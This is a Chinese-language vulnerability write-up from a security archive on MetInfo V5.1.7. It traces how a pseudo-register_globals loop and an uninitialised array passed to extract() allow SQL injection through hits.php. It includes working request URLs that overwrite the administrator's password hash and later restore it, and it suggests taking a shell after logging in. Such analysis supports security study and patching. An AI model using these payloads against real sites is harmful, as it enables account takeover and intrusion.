---
source: "白阁文库 BaizeSec/bylibrary"
product: "MetInfo5.1.7"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "MetInfo V5.1.7 getshell"
prerequisites: "来源所述条件，未列明部分仍待核：伪register_globals+未初始化settings，hits入口；固定管理员id1/表前缀"
side_effects: "未执行；本文需注意的操作影响：根因链有源码与Wooyun编号，写改管理员密码到1并借admin_introduction存旧hash有副作用；标题getshell但正文只密码修改和后台登录，无具体RCE下半链"
source_status: "unknown"
id: "vw-cd324b1331317a7af116ae30"
entity_id: "ve-cd324b1331317a7af116ae30"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：伪register_globals+未初始化settings，hits入口；固定管理员id1/表前缀

- **操作与副作用边界（1）**：根因链有源码与Wooyun编号，写改管理员密码到1并借admin_introduction存旧hash有副作用。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（2）**：标题getshell但正文只密码修改和后台登录，无具体RCE下半链。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：示例settings\[met_img\]与实际update$met_hits需要补中间赋值代码；不是PHP配置register_globals必须开启。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# metinfo多个漏洞

## Affected Version 

__版本：MetInfo V5.1.7  2013年5月23__    


__[metinfo多个漏洞(可getshell)  ](http://wooyun.jozxing.cc/static/bugs/wooyun-2013-043795.html)__


审计一般先看核心文件。

`\include\common.inc.php` 中的21-28行

	define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
	isset($_REQUEST['GLOBALS']) && exit('Access Error');
	require_once ROOTPATH.'include/global.func.php';
	foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
		foreach($$_request as $_key => $_value) {
			$_key{0} != '_' && $$_key = daddslashes($_value);
		}
	}


大概从21行程序开始使用了伪`register_globals`机制。


2： 变量未初始化及extract函数使用不当。

在`common.inc.php`文件随后的代码里包含了一个`config.inc.php`的文件, 看名字就知道是一些初始化变量配置, 程序员将应用程序所需变量

放在了`register_globals`机制之后声明估计就是怕变量被覆盖.但是`config.inc.php`的一个数组`$settings`却忘记了初始化.


	/*读配置数据*/
	$query = "SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'";
	$result = $db->query($query);
	while($list_config= $db->fetch_array($result)){
		if($metinfoadminok)$list_config['value']=str_replace('"', '&#34;', str_replace("'", '&#39;',$list_config['value']));
		$settings_arr[]=$list_config;
		if($list_config['columnid']){
			$settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value'];
		}else{
			$settings[$list_config['name']]=$list_config['value'];
		}
		if($list_config['flashid']){
			$list_config['value']=explode('|',$list_config['value']);
			$falshval['type']=$list_config['value'][0];
			$falshval['x']=$list_config['value'][1];
			$falshval['y']=$list_config['value'][2];
			$falshval['imgtype']=$list_config['value'][3];
			$met_flasharray[$list_config['flashid']]=$falshval;
		}
	}
	@extract($settings);

>在没有初始化的情况下又使用了extract($settings),结合前面的register_globals机制这样就导致多个变量可以被覆盖掉从而控制整个程序逻辑.


3:sql注入绕过

	前面的防注入函数里可以看到替换了一些常用的关键字，使注入的难度增加了，但那仅仅只对sql语句的where之后注入有所防范。
	
	对于可以覆盖系统变量的咋们来讲就不太管用了而且无视GPC，sql注释符也没有过滤。
	
	为了降低攻击成本我挑了一处最容易实现攻击地方，一个update的sql语句。
	
	在 include\hits.php的25行左右。
	
	$query = "update $met_hits SET hits='$hits_list[hits]' where id='$id'";
	
	覆盖掉$met_hits变量就可以update任何数据表，如修改管理员密码。
	
	hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23
	
	使用密码1登陆后台拿shell，再把管理员密码改回来。
	
	hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23


修改密码

	http://192.168.86.194:9000/MetInfo517/include/hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23


将密码修改为 1


## References

[metinfo多个漏洞(可getshell) --wooyun-2013-043795 ](http://wooyun.jozxing.cc/static/bugs/wooyun-2013-043795.html)

[What is register_globals and why is it a security risk?](https://tournasdimitrios1.wordpress.com/2010/11/09/what-is-register_globals-and-why-is-it-a-security-risk/)

[register_globals](https://www.mediawiki.org/wiki/Register_globals)

[PHP Backdoors: Hidden With Clever Use of Extract Function](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html)

[PHP extract() Vulnerability](https://davidnoren.com/post/php-extract-vulnerability.html)


---

> 来源：白阁文库 BaizeSec/bylibrary
